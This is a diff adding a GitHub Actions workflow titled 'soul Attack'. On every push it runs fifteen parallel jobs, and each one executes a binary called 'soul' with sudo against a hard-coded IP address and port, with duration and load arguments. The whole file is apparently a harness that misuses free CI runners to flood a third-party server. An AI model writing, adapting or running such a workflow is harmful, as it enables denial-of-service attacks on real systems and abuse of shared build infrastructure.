@@ -1,0 +1,24 @@
+name: soul Attack
+on: [push]
+
+jobs:
+  first-five-jobs:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+    - uses: actions/checkout@v3
+    - run: chmod +x soul
+    - run: sudo ./soul 135.235.159.14 22427 5 100
+
+  next-ten-jobs:
+    runs-on: ubuntu-22.04
+    needs: first-five-jobs  # This ensures this job runs only after first-five-jobs completes
+    strategy:
+      matrix:
+        n: [6,7,8,9,10,11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - run: chmod +x soul
+    - run: sudo ./soul 135.235.159.14 22427 300 200
